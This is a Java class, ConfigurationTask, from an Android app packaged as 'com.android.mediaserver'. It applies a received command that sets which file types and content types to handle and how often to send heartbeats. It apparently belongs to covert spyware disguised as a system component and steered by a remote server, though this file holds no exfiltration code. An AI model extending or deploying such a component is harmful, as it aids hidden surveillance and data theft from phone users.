package com.android.mediaserver.task;

import android.content.Context;
import android.content.Intent;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.command.ConfigurationCommand;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.receiver.ReschedulingReceiver;
import timber.log.Timber;

public class ConfigurationTask extends Task {
  public ConfigurationTask(Command command, Context context) {
    super(command, context);
  }

  protected Void doInBackground(Void... params) {
    publishProgress(new TaskStatus[] { TaskStatus.IN_PROGRESS });
    boolean shouldReschedule = false;
    Config config = Config.getInstance(mContext);
    ConfigurationCommand command = (ConfigurationCommand) mCommand;
    config.setContentTypes(command.getContentTypes());
    config.setExtensions(command.getFileTypes());
    config.setHeartbeatsPerSend(command.getHeartbeatsPerSend());
    if (config.getHeartbeatInterval() != command.getHeartbeatInterval()) {
      config.setHeartbeatInterval(command.getHeartbeatInterval());
      shouldReschedule = true;
    }
    try {
      config.updateConfig(mContext);
      if (true == shouldReschedule) {
        Timber.d("Need to reschedule alarms since interval has changed", new Object[0]);
        mContext.sendBroadcast(new Intent(mContext, ReschedulingReceiver.class));
      }
      publishProgress(new TaskStatus[] { TaskStatus.SUCCEEDED });
    } catch (Exception e) {
      publishProgress(new TaskStatus[] { TaskStatus.FAILED });
    }
    return null;
  }

  protected void onPostExecute(Void aVoid) {
    super.onPostExecute(aVoid);
  }
}
